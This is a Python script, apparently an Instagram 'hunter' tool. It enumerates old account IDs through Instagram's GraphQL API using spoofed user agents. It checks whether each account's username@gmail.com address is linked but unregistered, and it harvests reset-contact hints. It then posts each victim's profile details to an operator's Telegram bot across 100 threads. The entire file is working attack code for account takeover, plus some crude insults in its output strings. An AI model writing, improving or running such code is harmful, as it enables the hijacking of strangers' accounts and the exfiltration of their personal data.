print ('W8 RAZA BHAI KO ANE DE ')
import Topython
import threading , webbrowser
import random , time
from cfonts import render
import requests
import json
import sys
import os
from colorama import Fore,init
ALI = render('{RAZA}}', colors=['green', 'yellow'], align='center', font='block', background='red')
QE = render('{HERE}}', colors=['green', 'yellow'], align='center', font='block', background='red')
print(ALI)
print(QE)
time.sleep(3)

init(autoreset=True)
hits_total=0
usernames_generated=0
emails_connected=0
counter_lock=threading.Lock()
def check_gmail(email=None):
	try:response=Topython.Email.gmail(email=email);return'Good'if response else'Bad'
	except:return'Unknown'
def send_telegram_message(token,chat_id,message):
	try:url=f"https://api.telegram.org/bot{token}/sendMessage";buttons={'inline_keyboard':[[{'text':'DEVELOPER','url':'https://razaplugs'},{'text':'CHANNEL','url':'https://razapython'}]]};payload={'chat_id':chat_id,'text':message,'reply_markup':json.dumps(buttons)};requests.post(url,data=payload)
	except:pass
def update_display():
	os.system('cls'if os.name=='nt'else'clear');permanent_text=f"""{Fore.RED}==============================
{Fore.CYAN}CHANNEL : @razapython
{Fore.RED}==============================
""";sys.stdout.write(permanent_text);sys.stdout.flush()
	while True:output=f"{Fore.GREEN}HITS: {hits_total} | {Fore.WHITE}GEN: {usernames_generated} | {Fore.YELLOW}EMAIL: {emails_connected}\r";sys.stdout.write(output);sys.stdout.flush()
def fetch_instagram_users(token,chat_id):
	global hits_total,usernames_generated,emails_connected
	while True:
		username=GenUsers(2013)
		if username:
			with counter_lock:usernames_generated+=1
			email=username+'@gmail.com'
			if Topython.Instagram.CheckEmail(email):
				with counter_lock:emails_connected+=1
				availability=check_gmail(email)
				if availability=='Good':
					info=Topython.Instagram.information(username);rest_response=Topython.Instagram.Rests(username);r=rest_response if isinstance(rest_response,str)else''
					if r and r.split('@')[0][0]==username[0]and r.split('@')[0][-1]==username[-1]:
						hit_text=f"""
💀💀
________________________
🫶🐼
________________________
NAME : {info.get("name")}
USERNAME: {info.get("username")}
Followers: {info.get("followers")}
Following: {info.get("following")}
Date : {info.get("date")}
ID : {info.get("id")}
EMAIL : {email}
RESET: {r}
POST : {info.get("post")}
BIOGRAPHY : {info.get("bio")}
PRIVATE : {info.get("is_private")}
_________________________________________
BY @razapython
"""
						with counter_lock:hits_total+=1
						send_telegram_message(token,chat_id,hit_text)
					else:
						crack_text=f"""
LE RE LAND KE
________________________

NAME : {info.get("name")}
USERNAME: {info.get("username")}
Followers: {info.get("followers")}
Following: {info.get("following")}
Date : {info.get("date")}
ID : {info.get("id")}
EMAIL : {email}
Reset : {r}
POST : {info.get("post")}
BIOGRAPHY : {info.get("bio")}
PRIVATE : {info.get("is_private")}
_________________________________________
BY @razapython
"""
						with counter_lock:hits_total+=1
						send_telegram_message(token,chat_id,crack_text)
				elif availability=='Bad':pass
			else:pass
def GenUsers(date):
	if date==2013:iD=str(random.randrange(281874,514197353))
	else:return
	rnd=str(random.randint(150,999));user_agent='Instagram 311.0.0.32.118 Android ('+['23/6.0','24/7.0','25/7.1.1','26/8.0','27/8.1','28/9.0'][random.randint(0,5)]+'; '+str(random.randint(100,1300))+'dpi; '+str(random.randint(200,2000))+'x'+str(random.randint(200,2000))+'; '+['SAMSUNG','HUAWEI','LGE/lge','HTC','ASUS','ZTE','ONEPLUS','XIAOMI','OPPO','VIVO','SONY','REALME'][random.randint(0,11)]+'; SM-T'+rnd+'; SM-T'+rnd+'; qcom; en_US; 545986'+str(random.randint(111,999))+')';lsd=''.join(random.choice('azertyuiopmlkjhgfdsqwxcvbnAZERTYUIOPMLKJHGFDSQWXCVBN1234567890')for _ in range(32));headers={'accept':'*/*','accept-language':'en,en-US;q=0.9','content-type':'application/x-www-form-urlencoded','dnt':'1','origin':'https://www.instagram.com','priority':'u=1, i','referer':'https://www.instagram.com/cristiano/following/','user-agent':user_agent,'x-fb-friendly-name':'PolarisUserHoverCardContentV2Query','x-fb-lsd':lsd};data={'lsd':lsd,'fb_api_caller_class':'RelayModern','fb_api_req_friendly_name':'PolarisUserHoverCardContentV2Query','variables':'{"userID":"'+str(iD)+'","username":"cristiano"}','server_timestamps':'true','doc_id':'7717269488336001'}
	try:response=requests.post('https://www.instagram.com/api/graphql',headers=headers,data=data);username=response.json()['data']['user']['username'];return username
	except:
		try:variables=json.dumps({'id':iD,'render_surface':'PROFILE'});data={'lsd':lsd,'variables':variables,'doc_id':'25618261841150840'};response=requests.post('https://www.instagram.com/api/graphql',headers={'X-FB-LSD':lsd},data=data);username=response.json()['data']['user']['username'];return username
		except:return
if __name__=='__main__':
	token=input(Fore.BLUE+' TOKEN :  '+Fore.RESET);chat_id=input(Fore.RED+' ID :  '+Fore.RESET);display_thread=threading.Thread(target=update_display);display_thread.daemon=True;display_thread.start();threads=[threading.Thread(target=fetch_instagram_users,args=(token,chat_id))for _ in range(100)]
	for t in threads:t.start()
	for t in threads:t.join()

